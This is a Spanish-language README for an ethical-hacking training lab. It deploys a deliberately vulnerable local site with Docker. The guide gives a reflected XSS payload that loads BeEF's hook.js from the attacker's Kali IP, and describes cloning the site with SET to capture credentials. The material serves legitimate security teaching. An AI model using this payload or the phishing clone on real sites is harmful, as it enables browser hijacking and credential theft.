# 🏗️ Infraestructura del Laboratorio: Pixel Paradise Target

Este escenario proporciona un entorno web vulnerable para practicar ataques de **Ingeniería Social** y **Explotación del Navegador (BeEF)**.

---

## 🚀 Despliegue con Docker

Para levantar el entorno:
1.  Asegúrate de tener **Docker** y **Docker Compose** instalados.
2.  Desde esta carpeta, ejecuta:
    ```bash
    docker-compose up -d
    ```
3.  El sitio estará disponible en: `http://localhost:8081`

---

## 🧪 Prácticas Sugeridas

### 1. XSS Reflejado (BeEF Hooking)
El formulario de comentarios en la página principal es vulnerable a **XSS**. 
*   **Ataque:** Introduce el siguiente payload en el cuadro de búsqueda/comentario:
    ```html
    <script src="http://[TU_IP_KALI]:3000/hook.js"></script>
    ```
*   **Resultado:** El navegador que visite esa URL será "enganchado" por tu panel de BeEF.

### 2. Clonación de Sitios (SET)
Puedes usar la URL `http://localhost:8081` como objetivo para el **Site Cloner** de SET.
*   **Flujo:** SET descargará el código de Pixel Paradise y creará una copia exacta para capturar credenciales en tu máquina Kali.

---

## 🧹 Limpieza
Para detener y eliminar el contenedor:
```bash
docker-compose down
```

---
*Módulo 04 - Cisco Ethical Hacker*
